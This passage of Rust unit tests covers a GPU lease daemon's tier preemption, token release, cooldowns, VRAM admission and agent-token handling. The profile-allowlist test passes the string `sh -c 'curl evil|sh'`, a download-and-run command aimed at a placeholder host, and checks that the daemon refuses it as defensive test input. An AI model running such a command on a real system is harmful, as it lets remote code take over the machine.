    fn adopt_scope_clamps_a_lane_to_at_most_batch() {
        // The invariant `adopt_scope` enforces (ADR-0022 + review): a lane must never be Interactive — the
        // only non-preemptible tier — or it could never be reclaimed. Interactive clamps to Batch; lower
        // tiers pass through. (do_acquire's Trusted clamp is identity, so this ceiling lives at the verb.)
        assert_eq!(Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch), Tier::Batch);
        assert_eq!(Tier::from_arg("batch").unwrap().clamp_to(Tier::Batch), Tier::Batch);
        assert_eq!(Tier::from_arg("best-effort").unwrap().clamp_to(Tier::Batch), Tier::BestEffort);
        // End-to-end: a lane clamped to Batch QUEUES behind a live Interactive holder (never preempts it).
        let mut st = LeaseState::new();
        st.acquire(Tier::Interactive, &fits()); // a live human/interactive holder
        let lane_tier = Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch); // == Batch
        assert_eq!(st.acquire(lane_tier, &fits()), AcquireResult::Queued);
    }

    #[test]
    fn fresh_grant_is_denied_when_it_wont_fit() {
        let mut st = LeaseState::new();
        assert_eq!(st.acquire(Tier::Batch, &wont_fit()), AcquireResult::Denied);
        assert_eq!(st.holder_tier(), None); // nothing was acquired
    }

    #[test]
    fn preempt_ignores_admission_because_eviction_frees_vram() {
        // The batch holds; interactive arrives and current-free won't fit — it STILL
        // preempts, because SIGKILLing the batch reclaims its VRAM (§5/§6).
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(
            st.acquire(Tier::Interactive, &wont_fit()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
    }

    #[test]
    fn release_requires_the_current_token() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert!(!st.release(99)); // wrong token: no-op
        assert!(st.holder_tier().is_some());
        assert!(st.release(1));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn stale_release_from_a_preempted_holder_cannot_free_its_successor() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        st.acquire(Tier::Interactive, &fits()); // token 2 preempts
        assert!(!st.release(1)); // the evicted batch's stale release must not fire
        assert_eq!(st.holder_token(), 2); // interactive still holds
        assert!(st.release(2));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn release_on_an_empty_lease_is_false() {
        assert!(!LeaseState::new().release(1));
    }

    #[test]
    fn holder_est_is_carried_through_acquire() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &admit(20_000, 3_000, 512)); // est 3000
        assert_eq!(st.holder_est(), Some(3_000));
        st.acquire(Tier::Interactive, &admit(20_000, 9_000, 512)); // preempt, est 9000
        assert_eq!(st.holder_est(), Some(9_000));
    }

    #[test]
    fn headroom_scales_with_estimate_floored_at_base() {
        assert_eq!(headroom_for(0), HEADROOM_MIB); // floor
        assert_eq!(headroom_for(4_000), HEADROOM_MIB); // 250 < 512 → floor
        assert_eq!(headroom_for(20_000), 1_250); // 6.25% dominates the floor
    }

    #[test]
    fn cooldown_blocks_the_evicted_tier_but_never_interactive() {
        let t0 = Instant::now();
        let cd = Some((Tier::Batch, t0 + Duration::from_secs(8)));
        // The just-preempted batch is blocked while the dwell is active...
        assert!(cooling_down(cd, Tier::Batch, t0));
        // ...but interactive (top priority) is never delayed, even mid-dwell.
        assert!(!cooling_down(cd, Tier::Interactive, t0));
        // A different tier isn't affected by batch's cooldown.
        assert!(!cooling_down(cd, Tier::BestEffort, t0));
        // After the dwell expires, batch may re-acquire.
        assert!(!cooling_down(cd, Tier::Batch, t0 + Duration::from_secs(9)));
        // No cooldown set → never blocked.
        assert!(!cooling_down(None, Tier::Batch, t0));
    }

    #[test]
    fn profile_allowlist_resolves_known_rejects_unknown() {
        // Known profiles resolve to an absolute, daemon-owned command (no caller binary).
        let comfy = resolve_profile("comfyui").unwrap();
        assert!(comfy[0].starts_with('/') && comfy[0].ends_with("start-comfyui.sh"));
        let blender = resolve_profile("blender-render").unwrap();
        assert!(blender[0].starts_with('/') && blender[0].ends_with("render-wrapper.sh"));
        // ADR-0023 P1: the EEVEE lane is its OWN allowlisted profile (distinct name), resolving to the
        // same hardened wrapper as the Cycles lane — the lease-layer distinction is the footprint.
        let eevee = resolve_profile("eevee-render").unwrap();
        assert!(eevee[0].starts_with('/') && eevee[0].ends_with("render-wrapper.sh"));
        assert_eq!(resolve_profile("sleep").unwrap(), vec!["/usr/bin/sleep".to_string()]);
        // Anything else — including an attempted binary path — is refused (closes S1 RCE).
        assert!(resolve_profile("/bin/sh").is_none());
        assert!(resolve_profile("sh -c 'curl evil|sh'").is_none());
        assert!(resolve_profile("").is_none());
    }

    #[test]
    fn eevee_render_is_admittable_where_cycles_would_deny() {
        // The reason `eevee-render` exists (ADR-0023 P1): against ComfyUI's ~5.8 GB residual headroom,
        // the Cycles `blender-render`'s ~8000-MiB estimate ALWAYS denies, but the lighter EEVEE estimate
        // fits, so a render can be admitted beside a warm model.
        let free = 5_800u64; // ComfyUI residual headroom
        let cycles_est = 8_000u64;
        assert!(
            !admit(free, cycles_est, headroom_for(cycles_est)).granted(),
            "the Cycles estimate must deny against ~5.8 GB free"
        );
        let eevee_est = EEVEE_RENDER_EST_MIB as u64;
        assert!(
            admit(free, eevee_est, headroom_for(eevee_est)).granted(),
            "the conservative EEVEE estimate must be admittable against the same headroom"
        );
    }

    #[test]
    fn acquire_outcome_typed_channels_pin_both_wire_shapes() {
        // ADR-0021 #2: the TRUSTED verbs keep their (granted, token, prose) wire — byte-for-byte, so
        // lease_client.py is unaffected — while AcquireAgent surfaces a TYPED, prose-free channel.
        let granted = AcquireOutcome {
            code: OutcomeCode::Granted,
            token: 5,
            tier_effective: "batch".into(),
            msg: "granted batch token 5 (free 9000M)".into(),
            short_mib: 0,
            retry_after_ms: 0,
        };
        assert_eq!(
            granted.clone().into_trusted_reply(),
            (true, 5, "granted batch token 5 (free 9000M)".to_string())
        );
        assert_eq!(
            granted.into_agent_reply(),
            (true, 5, "granted".to_string(), "batch".to_string(), 0, 0)
        );

        // A denial carries the numeric deficit, never a prose string the agent must parse.
        let denied = AcquireOutcome {
            code: OutcomeCode::Denied,
            token: 0,
            tier_effective: "batch".into(),
            msg: "denied: short 2000M (...)".into(),
            short_mib: 2000,
            retry_after_ms: 0,
        };
        assert_eq!(denied.into_agent_reply(), (false, 0, "denied".to_string(), "batch".to_string(), 2000, 0));

        // C7 cooldown is a DISTINCT daemon code carrying the precise remaining dwell as retry_after_ms;
        // the MCP layer folds it to the agent-visible `busy_retry` (never a bare failure).
        let cooling = AcquireOutcome {
            code: OutcomeCode::Cooling,
            token: 0,
            tier_effective: "batch".into(),
            msg: "cooling down: ...".into(),
            short_mib: 0,
            retry_after_ms: 5000,
        };
        assert_eq!(cooling.into_agent_reply(), (false, 0, "cooling".to_string(), "batch".to_string(), 0, 5000));

        // The forbidden word "queued" is never an outcome CODE — a held lease is `busy_retry` (the prose
        // may still say "queued" for the trusted log, but the agent only ever sees the code).
        assert_eq!(OutcomeCode::BusyRetry.as_str(), "busy_retry");
        assert_ne!(OutcomeCode::BusyRetry.as_str(), "queued");
    }

    #[test]
    fn ttl_for_agent_is_far_shorter_than_the_trusted_default() {
        // ADR-0021 #3: an Agent cooperative lease gets a ~90s TTL (+ the MCP server's Renew heartbeat),
        // NOT the 90-min dream default — so an abandoned agent lease behind a shared MCP connection
        // (where B4 can't see one sub-agent die) can't wedge the batch lane. (Defaults; both env-tunable;
        // this assumes the AGENTOSD_*_TTL_SECS overrides are unset, as in CI/local.)
        assert!(ttl_for(CallerClass::Agent) < ttl_for(CallerClass::Trusted));
        assert!(ttl_for(CallerClass::Agent) <= Duration::from_secs(120));
        assert_eq!(ttl_for(CallerClass::Trusted), lease_ttl());
        assert_eq!(ttl_for(CallerClass::Agent), agent_lease_ttl());
    }

    #[test]
    fn agent_tokens_are_random_and_nonzero_not_sequential() {
        // ADR-0021 #5: agent act tokens are unguessable random (defence-in-depth behind layer-2
        // identity) — a shared-connection sibling can't enumerate a live one. Trusted callers keep the
        // predictable monotonic token. Non-zero (0 == no-holder sentinel) + actually varying.
        let toks: Vec<u64> = (0..8).map(|_| random_agent_token()).collect();
        assert!(toks.iter().all(|&t| t != 0), "agent tokens must be non-zero (0 = not-granted sentinel)");
        assert!(
            toks.iter().collect::<std::collections::HashSet<_>>().len() > 1,
            "random tokens must vary, not be a constant"
        );
        // The pure core installs whatever token kind it is handed: Sequential mints monotonic (so the
        // existing token-value tests + smoke tests hold), Random uses the supplied value verbatim.
        let mut seq = LeaseState::new();
        assert_eq!(seq.acquire(Tier::Batch, &fits()), AcquireResult::Granted { token: 1 });
        let mut rnd = LeaseState::new();
        assert_eq!(
            rnd.acquire_with(Tier::Batch, &fits(), TokenKind::Random(0xDEAD_BEEF)),
            AcquireResult::Granted { token: 0xDEAD_BEEF }
        );
        // A stale release of the evicted token still fails after a random-token preempt (the guard is
        // token-equality, not monotonicity — so random is safe).
        rnd.acquire_with(Tier::Interactive, &fits(), TokenKind::Random(0x1234));
        assert!(!rnd.release(0xDEAD_BEEF), "evicted random token can't free its successor");
        assert!(rnd.release(0x1234));
    }

    #[test]
    fn go2_holder_peer_never_leaks_into_the_keyhole_mirror() {
        // ADR-0021 #7: the bound peer name is release/renew-authz state ONLY — it must never reach the
        // keyhole's lease mirror (or any wire/log except the B4 disconnect line). Freeze it: a holder
        // with a bound peer snapshots a Lease carrying tier/holder/preempt but NOT the peer's bus name.
        // (The producer-side twin of mcp.rs's consumer-side holder-identity no-leak pin.)
        let mut inner = Inner::new();
        inner.lease.acquire(Tier::Batch, &fits());
        let token = inner.lease.holder_token();
        inner.holder_peer = Some((token, ":1.4242-secret-peer".to_string()));
        let snap = lease_snapshot(&inner);
        let blob = serde_json::to_string(&snap).unwrap();
        assert!(!blob.contains(":1.4242-secret-peer"), "holder_peer must never appear in the mirror");
        assert!(!blob.contains("4242"), "no fragment of the bound peer name leaks");
        assert_eq!(snap.tier, "batch"); // the tier IS published (legible + non-identifying) — that's fine
    }

    #[test]
    fn fits_after_evict_completes_the_preempt_decision() {
        // Reclaimable 2GB victim, 20GB successor, 4GB free → predicted 6GB < 20GB → WONT-FIT.
        assert!(!fits_after_evict(4_000, 2_000, true, 20_000, headroom_for(20_000)));
        // Reclaimable big victim makes room for the successor → fits.
        assert!(fits_after_evict(2_000, 19_000, true, 18_000, 512));
        // Cooperative victim (not reclaimable) frees nothing → only current free counts.
        assert!(!fits_after_evict(4_000, 19_000, false, 18_000, 512));
        assert!(fits_after_evict(20_000, 0, false, 18_000, 512));
    }

    // --- ADR-0041 §5a: bounded reap = the over-admit-window confirm-free ---

    #[tokio::test]
    async fn reap_bounded_confirms_a_quickly_exiting_child() {
        // A child that exits immediately is confirmed reaped within the budget → true: its CUDA context
        // is torn down and the preempt grant may safely proceed (no over-admit into not-yet-freed VRAM).
        let child = Command::new("/usr/bin/true").spawn().expect("spawn true");
        assert!(
            reap_bounded(child, Duration::from_secs(3)).await,
            "a quickly-exiting child must be confirmed reaped within the budget"
        );
    }

    #[tokio::test]
    async fn reap_bounded_times_out_on_a_live_child_without_hanging() {
        // A still-running child is NOT confirmed within a tiny budget → false, returning PROMPTLY
        // (fail-open: the daemon proceeds rather than stalling on an unkillable/D-state child; the next
        // admission's true-free read governs). kill_on_drop lets the detached reaper's Child clean up.
        let child = Command::new("/usr/bin/sleep")
            .arg("30")
            .kill_on_drop(true)
            .spawn()
            .expect("spawn sleep");
        assert!(
            !reap_bounded(child, Duration::from_millis(50)).await,
            "a live child must not be falsely confirmed reaped within a 50ms budget (and must not hang)"
        );
    }

    // --- ADR-0041 drain-on-free signal (freed_seq) ---

    #[tokio::test]
    async fn freed_seq_advances_on_a_real_release_but_not_a_no_op_release() {
        let inner = Arc::new(Mutex::new(Inner::new()));
        // A COOPERATIVE holder (no owned child → release_token does no SIGKILL and touches no NVML).
        let token = {
            let mut g = inner.lock().await;
            match g.lease.acquire(Tier::Batch, &fits()) {
                AcquireResult::Granted { token } => token,
                other => panic!("expected Granted, got {other:?}"),
            }
        };
        let before = inner.lock().await.freed_seq;
        // A real release frees the lease → bump the drain signal (the arbiter's wake).
        assert!(release_token(&inner, None, token, None).await);
        let after = inner.lock().await.freed_seq;
        assert_eq!(after, before + 1, "releasing the lease must bump freed_seq");
        // A second release of the now-stale token frees nothing → no bump (capacity unchanged).
        assert!(!release_token(&inner, None, token, None).await);
        assert_eq!(inner.lock().await.freed_seq, after, "a no-op release must NOT bump freed_seq");
    }

    #[tokio::test]
    async fn freed_seq_is_unchanged_by_grant_and_preempt_and_is_mirrored() {
        let inner = Arc::new(Mutex::new(Inner::new()));
        let mut g = inner.lock().await;
        // A fresh grant TAKES the lease; it frees no capacity for a waiter → no bump.
        g.lease.acquire(Tier::Batch, &fits());
        assert_eq!(g.freed_seq, 0, "acquiring frees nothing → freed_seq stays 0");
        // A preempt hands the lease to the preemptor (still held) → also no bump.
        assert!(matches!(g.lease.acquire(Tier::Interactive, &fits()), AcquireResult::Preempted { .. }));
        assert_eq!(g.freed_seq, 0, "a preempt frees no capacity for a waiter → freed_seq stays 0");
        // The mirror stamps the live counter so the arbiter reads it off lease.json.
        g.freed_seq = 7;
        assert_eq!(lease_snapshot(&g).freed_seq, 7, "the lease.json mirror must carry the live freed_seq");
    }
}
